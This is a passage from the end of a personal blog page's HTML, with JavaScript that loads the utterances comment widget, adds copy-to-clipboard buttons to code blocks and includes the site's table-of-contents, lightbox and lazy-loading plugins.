    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>
</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>

</html>
